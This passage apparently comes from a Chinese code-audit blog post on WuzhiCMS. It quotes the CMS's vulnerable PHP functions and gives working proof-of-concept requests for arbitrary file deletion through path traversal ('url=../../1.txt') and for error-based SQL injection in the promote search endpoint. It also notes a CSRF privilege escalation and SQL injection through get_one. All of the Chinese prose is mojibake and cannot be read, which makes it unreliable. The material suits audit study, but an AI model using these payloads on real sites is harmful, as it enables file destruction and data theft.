class="hljs-variable">$packageDir</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$handle</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$packageDir</span>.<span class="hljs-string">&#x27;/delete&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-variable">$filePath</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$handle</span>)) &#123;<br>            <span class="hljs-variable">$filePath</span>= <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$filePath</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)==<span class="hljs-string">&#x27;coreframe&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = COREFRAME_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">9</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125; <span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>)==<span class="hljs-string">&#x27;www&#x27;</span>) &#123;<br>                <span class="hljs-variable">$fullPath</span> = WWW_ROOT.<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$filePath</span>,<span class="hljs-number">3</span>);<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">exists</span>(<span class="hljs-variable">$fullPath</span>)) &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;filesystem-&gt;<span class="hljs-title function_ invoke__">remove</span>(<span class="hljs-variable">$fullPath</span>);<br>                &#125;<br>            &#125;<br><br>        &#125;<br><br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$handle</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="æœå…³é”®å­—"><a href="#æœå…³é”®å­—" class="headerlink" title="æœå…³é”®å­—"></a>æœå…³é”®å­—</h1><h2 id="æ–‡ä»¶å®‰å…¨ï¼š"><a href="#æ–‡ä»¶å®‰å…¨ï¼š" class="headerlink" title="æ–‡ä»¶å®‰å…¨ï¼š"></a>æ–‡ä»¶å®‰å…¨ï¼š</h2><h3 id="ä»»æ„æ–‡ä»¶åˆ é™¤"><a href="#ä»»æ„æ–‡ä»¶åˆ é™¤" class="headerlink" title="ä»»æ„æ–‡ä»¶åˆ é™¤"></a>ä»»æ„æ–‡ä»¶åˆ é™¤</h3><p>æœç´¢del() -&gt; coreframe&#x2F;app&#x2F;attachment&#x2F;admin&#x2F;index.php -&gt; del()</p><p>æœ‰å¯æ§å˜é‡ $url </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//ä»å…¨å±€å˜é‡ $GLOBALS ä¸­è·å– id å’Œ url</span><br>        <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//remove_xss() å‡½æ•°ç”¨æ¥æ¸…ç† url å˜é‡ï¼Œé˜²æ­¢ XSS æ”»å‡»</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//åˆ¤æ–­æ˜¯å¦éƒ½ä¸ºç©º</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<span class="hljs-comment">//æŒ‰ id åˆ é™¤</span><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<span class="hljs-comment">//å°† id è½¬åŒ–ä¸ºæ•°ç»„</span><br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<span class="hljs-comment">//ä» attachment è¡¨ä¸­æŸ¥æ‰¾è¯¥ idçš„è®°å½•å¹¶å–usertimes å’Œ path</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//è‹¥å¼•ç”¨æ•°å¤§äº 1ï¼Œåªå‡å°‘ä½¿ç”¨æ¬¡æ•°ï¼Œä¸åˆ é™¤ç‰©ç†æ–‡ä»¶</span><br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//å¦åˆ™ï¼Œå½»åº•åˆ é™¤</span><br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<span class="hljs-comment">//æŒ‰url åˆ é™¤ï¼Œå¦‚æœæ²¡æœ‰ URLï¼ŒæŠ¥é”™è¿”å›ã€‚</span><br>            <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<span class="hljs-comment">//å°† URL ä¸­çš„ ATTACHMENT_URL å»æ‰ï¼Œå¾—åˆ°æ–‡ä»¶ç›¸å¯¹è·¯å¾„ path</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>                <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<span class="hljs-comment">//æ ¹æ® path æŸ¥æ‰¾æ•°æ®åº“è®°å½•</span><br>                <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<span class="hljs-comment">//å¦‚æœæ²¡æœ‰è®°å½•ï¼Œåªåˆ ç‰©ç†æ–‡ä»¶</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br><br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//å¼•ç”¨å¤šæ¬¡ï¼Œåªå‡å¼•ç”¨æ¬¡æ•°</span><br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                    <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                    <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›my_unlink</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_unlink</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$path</span>)) <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$path</span>);<span class="hljs-comment">//æ–‡ä»¶å­˜åœ¨ç›´æ¥åˆ é™¤</span><br>    &#125;<br></code></pre></td></tr></table></figure><p>index.php?m&#x3D;attachment&amp;f&#x3D;index&amp;v&#x3D;del&amp;_su&#x3D;wuzhicms&amp;url&#x3D;..&#x2F;..&#x2F;1.txt</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955817.png" alt="20250717140708632"></p><h2 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h2><p>æœç´¢select</p><p>å‘ç°è¿™é‡Œçš„å¾ˆå¤šå‚æ•°éƒ½æ˜¯åŸæ ·æ‹¼æ¥ï¼Œå¯èƒ½å­˜åœ¨é£é™©</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//  coreframe/app/core/libs/class/mysqli.class.php</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_list</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$keyfield</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br><span class="hljs-variable">$arr</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>)) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$keyfield</span>) &#123;<br><span class="hljs-variable">$arr</span>[<span class="hljs-variable">$data</span>[<span class="hljs-variable">$keyfield</span>]] = <span class="hljs-variable">$data</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$arr</span>[] = <span class="hljs-variable">$data</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›get_listå‡½æ•°ï¼Œæœ€ååªæ‰¾åˆ°è¿™é‡Œæœ‰å¯æ§å˜é‡ $fieldtypeã€$keywords</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// coreframe/app/promote/admin/index.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">search</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$siteid</span> = <span class="hljs-title function_ invoke__">get_cookie</span>(<span class="hljs-string">&#x27;siteid&#x27;</span>);<br>        <span class="hljs-variable">$page</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) ? <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) : <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-title function_ invoke__">max</span>(<span class="hljs-variable">$page</span>,<span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$fieldtype</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;fieldtype&#x27;</span>];<br>        <span class="hljs-variable">$keywords</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;keywords&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$fieldtype</span>==<span class="hljs-string">&#x27;place&#x27;</span>) &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `name` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote_place&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;pid ASC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listingplace&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;`siteid`=&#x27;<span class="hljs-subst">$siteid</span>&#x27; AND `<span class="hljs-subst">$fieldtype</span>` LIKE &#x27;%<span class="hljs-subst">$keywords</span>%&#x27;&quot;</span>;<br>            <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_list</span>(<span class="hljs-string">&#x27;promote&#x27;</span>,<span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>,<span class="hljs-variable">$page</span>,<span class="hljs-string">&#x27;id DESC&#x27;</span>);<br>            <span class="hljs-variable">$pages</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;pages;<br>            <span class="hljs-variable">$total</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;number;<br>            <span class="hljs-keyword">include</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">template</span>(<span class="hljs-string">&#x27;listing&#x27;</span>);<br>        &#125;<br><br><br>    &#125;<br></code></pre></td></tr></table></figure><p>$fieldtypeã€$keywordsä¿©ä¸ªå‚æ•°æ‹¼æ¥åˆ°$whereä¸­ï¼Œ</p><p>æ„é€ poc:</p><p><code>index.php?m=promote&amp;f=index&amp;_su=wuzhicms&amp;v=search&amp;fieldtype=place&amp;keywords=1%27%20or%20extractvalue(1,concat(0x7e,user()))%20--+</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080955190.png" alt="20250717143106637"></p><h1 id="è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°"><a href="#è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°" class="headerlink" title="è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°"></a>è®°ä¸€äº›çŸ¥è¯†ç‚¹ã€å‡½æ•°</h1><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso">$GLOBALS = <span class="hljs-built_in">array</span>();<span class="hljs-comment">//æ¸…é™¤æ‰€æœ‰çš„å…¨å±€å˜é‡</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">microtimeå‡½æ•°è¿”å›å½“å‰ Unix æ—¶é—´æˆ³çš„å¾®ç§’æ•°ã€‚<br></code></pre></td></tr></table></figure><p>magic_quotes_runtime çš„ä½œç”¨</p><p><a href="http://blog.csdn.net/tom_green/article/details/7039002">http://blog.csdn.net/tom_green/article/details/7039002</a></p><p>magic_quotes_gpcå‡½æ•°è¯¦è§£ </p><p><a href="https://www.cnblogs.com/timelesszhuang/p/3726736.html">https://www.cnblogs.com/timelesszhuang/p/3726736.html</a></p><h1 id="æ¼æ´è¡¥å……ï¼š"><a href="#æ¼æ´è¡¥å……ï¼š" class="headerlink" title="æ¼æ´è¡¥å……ï¼š"></a>æ¼æ´è¡¥å……ï¼š</h1><h2 id="CSRFæ¼æ´"><a href="#CSRFæ¼æ´" class="headerlink" title="CSRFæ¼æ´"></a>CSRFæ¼æ´</h2><p>äº”æŒ‡CMS 4.1.0ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªCSRFæ¼æ´ï¼Œå½“ç®¡ç†å‘˜ç™»é™†åè®¿é—®ä¸‹é¢CSRFæµ‹è¯•é¡µé¢å¯å°†æ™®é€šç”¨æˆ·ææˆä¸ºç®¡ç†å‘˜æƒé™ã€‚</p><h2 id="å‰å°SQLæ³¨å…¥"><a href="#å‰å°SQLæ³¨å…¥" class="headerlink" title="å‰å°SQLæ³¨å…¥"></a>å‰å°SQLæ³¨å…¥</h2><p>å¤šä¸ªå˜é‡æœªä½¿ç”¨å¼•å·åŒ…è£¹çš„SQLè¯­å¥,åªè¦æ˜¯è°ƒç”¨<code>get_one</code>è¿™ä¸ªå‡½æ•°çš„åœ°æ–¹éƒ½å­˜åœ¨SQLæ³¨å…¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_one</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$where</span>, <span class="hljs-variable">$field</span> = <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$order</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$group</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$condition</span> = <span class="hljs-literal">TRUE</span></span>) </span>&#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-variable">$where</span> ? <span class="hljs-string">&#x27; WHERE &#x27;</span>.<span class="hljs-variable">$where</span>: <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$condition</span>) &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable">$field</span> == <span class="hljs-string">&#x27;*&#x27;</span> ? <span class="hljs-string">&#x27;*&#x27;</span> : <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">safe_filed</span>(<span class="hljs-variable">$field</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$field</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">escape_string</span>(<span class="hljs-variable">$field</span>);<br>&#125;<br><span class="hljs-variable">$order</span> = <span class="hljs-variable">$order</span> ? <span class="hljs-string">&#x27; ORDER BY &#x27;</span>.<span class="hljs-variable">$order</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$group</span> = <span class="hljs-variable">$group</span> ? <span class="hljs-string">&#x27; GROUP BY &#x27;</span>.<span class="hljs-variable">$group</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$limit</span> = <span class="hljs-variable">$limit</span> ? <span class="hljs-string">&#x27; LIMIT &#x27;</span>.<span class="hljs-variable">$limit</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&#x27;SELECT &#x27;</span>.<span class="hljs-variable">$field</span>.<span class="hljs-string">&#x27; FROM `&#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;tablepre.<span class="hljs-variable">$table</span>.<span class="hljs-string">&#x27;`&#x27;</span>.<span class="hljs-variable">$where</span>.<span class="hljs-variable">$group</span>.<span class="hljs-variable">$order</span>.<span class="hljs-variable">$limit</span>;<br><span class="hljs-variable">$query</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">fetch_array</span>(<span class="hljs-variable">$query</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php,æ‰¾åˆ°å¯æ§å˜é‡</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 